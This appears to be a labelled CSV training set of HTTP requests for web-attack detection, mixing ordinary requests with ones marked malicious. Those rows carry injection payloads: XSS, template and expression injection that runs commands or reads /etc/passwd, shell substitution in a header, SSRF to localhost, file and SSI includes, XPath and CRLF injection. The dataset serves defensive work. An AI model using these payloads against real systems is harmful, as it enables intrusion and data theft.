label,text
benign,"GET /collections/outdoor-furniture HTTP/1.1
Host: greenhavenliving.org
Connection: close
Accept: text/html
Accept-Language: en-US,en;q=0.8
Referer: https://greenhavenliving.org/
Cookie: session=bf3729a0f1d56eab; cart=87debc4157
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
benign,"POST /orders/api/v1/create HTTP/1.1
Host: online-retail-store.biz
Authorization: Bearer qowr0ru0293r8uf03q90jrsner39fjsn
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Content-Length: 214
Connection: keep-alive

<?xml version=""1.0"" encoding=""UTF-8""?>
<Order>
  <CustomerID>873462</CustomerID>
  <OrderDate>2024-06-07T14:22:10Z</OrderDate>
  <Items>
    <Item>
      <ProductID>5523</ProductID>
      <Quantity>2</Quantity>
    </Item>
    <Item>
      <ProductID>6627</ProductID>
      <Quantity>1</Quantity>
    </Item>
  </Items>
  <ShippingMethod>Express</ShippingMethod>
</Order>"
malicious,"POST /api/v1/user/profile/update HTTP/1.1
Host: cloud-networks-management.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
X-User-Input: <iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydChbIkltcGxhbnQiLFsid2Vic2l0ZSIsIjxhIHJlZj0iL2luamVjdC9zdHVkZW50PyI+Il0pPC9zY3JpcHQ+""></iframe>
Content-Length: 87

{""firstname"":""Laura"",""lastname"":""Palmer"",""email"":""laura.palmer@cloud-networks-management.ai""}"
malicious,"GET /dashboard/reports HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
X-Reflected-Data: <iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgnSGFja2VkIScpPC9zY3JpcHQ+""></iframe>
Cache-Control: no-cache"
benign,"GET /favicon.ico HTTP/1.1
Host: city-library-network.ca
Connection: keep-alive
Accept: image/x-icon,image/vnd.microsoft.icon,*/*;q=0.7
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0
Accept-Encoding: gzip, deflate
Accept-Language: en-CA,en;q=0.8"
benign,"PATCH /api/user/67241/settings/notifications HTTP/1.1
Host: online-retail-store.biz
Authorization: Bearer bY7ah32Nd18UQbGkaJw0vTmMJrZ\_z1DZ
Content-Type: application/json-patch+json
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Content-Length: 89

[{""op"": ""replace"", ""path"": ""/emailPromos"", ""value"": false}, {""op"": ""replace"", ""path"": ""/smsAlerts"", ""value"": true}]"
malicious,"POST /api/submitComment HTTP/1.1
Host: feedback-portal.cloudsync.ai
Content-Type: application/json
Content-Length: 152
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36

{""username"":""celeritas89"",""post_id"":1476,""user_comment"":""Really love this update! Also, check this out: javascript:alert('XSS')""}"
malicious,"PUT /settings/update HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
Accept: application/json
Accept-Encoding: gzip, deflate, br
User-Agent: Python-urllib/3.9
Sec-CH-UA: "" Not A;Brand"";v=""99"", ""Chromium"";v=""88"", ""Google Chrome"";v=""88""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Linux""
Cache-Control: no-cache

{
  ""complex_pattern_input"": ""abababababababababababababababababababababababababababababababababababX""
}"
benign,"GET /search?query=how%20to%20bake%20bread&category=recipes&sort=popularity HTTP/1.1
Host: recipes-for-everyone.co
Accept: application/json, text/plain, */*
X-Requested-With: XMLHttpRequest
Referer: https://recipes-for-everyone.co/home
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept-Language: en-GB,en;q=0.8
Connection: close"
benign,"GET /wiki/Resource_(disambiguation) HTTP/1.1
Host: urban-encyclopedia.biz
User-Agent: curl/7.88.1
Accept: */*
DNT: 1
Connection: keep-alive"
benign,"GET /assets/styles/theme.min.css HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept: text/css,*/*;q=0.1
Referer: https://secure-user-portal.net/dashboard/home
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache"
benign,"POST /api/v3/account/settings/configure HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer aS9C2pn9WdQX0oTvLezN56rsKD9YpVqt
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Connection: keep-alive
Content-Length: 278

{
  ""account"": {
    ""id"": 75421,
    ""preferences"": {
      ""themes"": [""dark"", ""high-contrast""],
      ""languages"": [""en-US"", ""fr-CA""],
      ""notifications"": {
        ""email"": true,
        ""push"": false,
        ""sms"": false
      }
    },
    ""security"": {
      ""twoFactorAuth"": {
        ""enabled"": true,
        ""methods"": [""authenticator_app"", ""sms""]
      },
      ""backupEmails"": [""backup1@secureportal.net"", ""backup2@secureportal.net""]
    }
  }
}"
malicious,"GET /events/logs/%7B%7Bself.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27netstat%20-an%27).read()%7D%7D HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Cache-Control: no-cache"
malicious,"POST /app/user/settings HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 158
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Origin: https://online-retail-store.biz

user_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9&display_name=Shopper123&bio=%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))%3C%2Fscript%3E"
benign,"GET /wiki/Resource_(disambiguation)?lang=fr HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.5,en;q=0.3
DNT: 1
Connection: keep-alive"
malicious,"POST /submit/comment HTTP/1.1
Host: blog-content-manager.net
User-Agent: CommentPoster/2.5 $(grep -i root /etc/passwd)
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Accept-Language: en-US,en;q=0.5

comment=Nice+post!+Thanks+for+sharing.&postId=89"
malicious,"GET /imgproxy?source=http://localhost:5984/_utils/ HTTP/1.1
Host: media-storage.homespot-cloud.info
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
malicious,"POST /v1/process-link HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Content-Length: 45
dataUrl=dict://127.0.0.1:11211/stats"
benign,"GET /api/v1/metadata?url=https%3A%2F%2Fonline-retail-store.biz%2Fproducts%2Felectronics%2Fsmartphone HTTP/1.1
Host: api.online-retail-store.biz
Accept: application/json
User-Agent: curl/7.88.1
Connection: close
Accept-Language: en-US"
benign,"GET /api/v1/users/profile HTTP/1.1
Host: elite-gaming-platform.gg
Accept: application/json
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJh...
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:113.0) Gecko/20100101 Firefox/113.0
X-CSRF-Token: 9a8f7e6c3fb452a1d876c564a0e13245
Connection: keep-alive"
benign,"GET /search?q=game+development HTTP/1.1
Host: indie-dev-forum.org
Connection: keep-alive
Accept: text/html
Referer: https://indie-dev-forum.org/
Cookie: session=gh928dhdu237dhf823hdhf8234dfg; theme=light
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Mobile Safari/537.36"
benign,"GET /news/feed/ HTTP/1.1
Host: culture-rhythm-magazine.com
Accept: application/rss+xml
User-Agent: NetNewsWire/6.3 (Macintosh; OS X 11.6)
Referer: https://culture-rhythm-magazine.com/featured
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"POST /api/v1/file/load HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: application/json
Content-Type: application/json
Content-Length: 28
Connection: keep-alive

{""filePath"": ""/etc/hosts""}"
benign,"POST /admin/login HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Language: en-US
Cache-Control: no-cache
Pragma: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Content-Length: 49
Connection: close

username=admin_user&password=8f4c9bb7de&remember_me=true"
benign,"POST /resources/config/update HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.ReallyLongToken123456789
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1
Connection: keep-alive

{
  ""blog_settings"": {
    ""layout"": ""masonry"",
    ""sidebar"": {
      ""enabled"": true,
      ""widgets"": [
        {""type"": ""search"", ""position"": 1},
        {""type"": ""categories"", ""position"": 2},
        {""type"": ""recent_posts"", ""position"": 3}
      ]
    },
    ""comments"": {
      ""enabled"": true,
      ""moderation"": {
        ""enabled"": true,
        ""review_queue_limit"": 50,
        ""trusted_users"": [""author_jane"", ""mod_paul""]
      }
    }
  },
  ""seo"": {
    ""meta_description"": ""Jane's personal tech and travel blog."",
    ""keywords"": [""tech"", ""travel"", ""reviews"", ""tutorials""]
  }
}"
benign,"GET /profile/settings HTTP/1.1
Host: user-dashboard-eu.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate, br
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36"
benign,"GET /js/framework/react.production.min.js HTTP/1.1
Host: community.game-dev-forum.org
Connection: keep-alive
Accept: application/javascript, */*;q=0.5
Referer: https://community.game-dev-forum.org/topic/3425/3d-graphics-tips
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept-Language: en-US,en;q=0.8"
benign,"POST /login HTTP/1.1
Host: digital-library-cloud.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Origin: https://digital-library-cloud.com
Referer: https://digital-library-cloud.com/login
Cookie: session=lib123abc; csrf=1092837ef8a4
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0

email=richard.amos%40digitallib.net&password=ReadMore2023"
benign,"GET /avatars/user12345 HTTP/1.1
Host: community.game-dev-forum.org
Accept: image/avif,image/webp,*/*
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obmRvZSIsImlhdCI6MTY4NjQ2MjU1MSwiZXhwIjoxNjg2NDY2MTUxfQ.m6ar6TCs3ZxSpW9U6hLKlGkRIqfH8Qq-PipDFC0vea4
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
Accept-Language: en-US,en;q=0.5
Content-Type: application/json-patch+json
Content-Length: 114
Authorization: Bearer CGe2KDs7bJGvZn0MjscNRS19
Connection: keep-alive

[{""op"": ""replace"", ""path"": ""/payment/methods/default"", ""value"": ""paypal""},{""op"":""remove"",""path"":""/wishlist/items/12345""}]"
benign,"POST /vote HTTP/1.1
Host: citizen-survey.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.6
Referer: https://citizen-survey.biz/votes/current
Content-Length: 24
Connection: keep-alive

poll_id=156&vote_option=green"
benign,"GET /products;category=books/recommendations HTTP/1.1
Host: digital-readers-world.info
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
X-Forwarded-For: 198.51.100.42"
malicious,"PATCH /api/v1/profile HTTP/1.1
Host: pro-services-hub.tech
Content-Type: application/json
Accept: application/json, text/plain, */*
User-Agent: Wget/1.21.1 (linux-gnu)
Accept-Encoding: gzip
Accept-Language: en-US,en;q=0.9
Referer: https://portal.pro-services-hub.tech/account
Cookie: psh_user=843fe214bc9de2a10a4cf19e6a7bcbb0

{
  ""display_name"": ""Michael S."",
  ""custom_greeting"": ""Hello ${'user'.toUpperCase()} ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cat /etc/passwd').getInputStream().readAllBytes()?new('java.lang.String',_)}!"",
  ""newsletter_subscribed"": true
}"
malicious,"POST /fetch/url HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Wget/1.21.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Charset: utf-8, iso-8859-1;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Connection: keep-alive

service_endpoint=dict://127.0.0.1:22222/data/info"
benign,"GET /atom.xml HTTP/1.1
Host: garden-tidbits.info
Accept: application/atom+xml
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Referer: https://garden-tidbits.info/articles/seasons/spring
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
malicious,"POST /api/v2/account/update HTTP/1.1
Host: financial-transaction-hub.org
User-Agent: Wget/1.21.1 (linux-gnu)
Content-Type: application/json
X-Security-Override: true
Accept: application/json
Content-Length: 78

{""account_id"":987654,""settings"":{""two_factor"":false,""email_notifications"":true}}"
malicious,"GET /browse?user=guest%0d%0a127.0.0.1%20-%20admin%20%5B10/Oct/2023:13:55:36%20-0700%5D%20%22POST%20/admin/login%20HTTP/1.1%22%20200%20789 HTTP/1.1
Host: shop.digital-electro-market.org
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: br, gzip, deflate
Connection: keep-alive"
benign,"GET /gallery/photos?category=landscape&search=%4a%5b%6c%7d HTTP/1.1
Host: urban-visuals-gallery.com
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Via: 1.1 varnish
Connection: close"
malicious,"POST /profile/edit HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Origin: https://online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://online-retail-store.biz/profile/edit

signature=Best+wishes+<!--#InClUdE ViRtUaL=""/etc/hosts"" -->"
malicious,"POST /api/v2/login HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Content-Type: application/x-www-form-urlencoded
Accept: */*
Cache-Control: no-cache
Content-Length: 86

email=bob%27%20and%20substring(concat(//user[1]/secret,substring('ABC',1,1)),1,1)%3D%27b&pass=123456"
benign,"POST /api/v1/feedback/submit HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer N3wToK3n56YzChRj99n5sV7BqJXWxZLp
Content-Type: application/json
Accept: application/json, text/html
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0
Content-Length: 147
Connection: keep-alive

{""feedback.entry-text"": ""Loving the new update! Performance is smoother."", ""user-info.email_address"": ""gamer42@somegame.net"", ""meta.time_submitted"": ""2024-06-21T12:05:30Z"", ""feedback.rating-stars"": 5}"
benign,"GET /api/v3/notifications/unread-count HTTP/1.1
Host: notifications.mobile-inbox.xyz
Accept: application/json
Authorization: Bearer token_23849a4ef0b9cdc8a1e182e6a77bb2e7
Origin: https://mobile-inbox.app
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Cache-Control: no-cache"
benign,"GET /search/results?q=laptop+gaming HTTP/1.1
Host: pixelstream-techshop.io
Cookie: search_pref=sort=price+desc&filter=available; user_id=9292847; region=APAC
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
malicious,"PATCH /api/v1/profile/update HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Content-Length: 290
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1
Origin: https://my-personal-blog-site.info
X-Requested-With: FetchAPIClient
Accept: application/json, */*
Accept-Language: en-US

{""displayName"": ""AliceM"", ""bio"": ""Tech blogger and photographer."", ""<img src=x onerror=\""eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\"">"": ""hiddenKey"", ""newsletter"": true}"
malicious,"GET /reports/daily HTTP/1.1
Host: analytics-server-cloud.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept-Encoding: gzip, deflate, br
X-SSL-Version: SSLv3
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
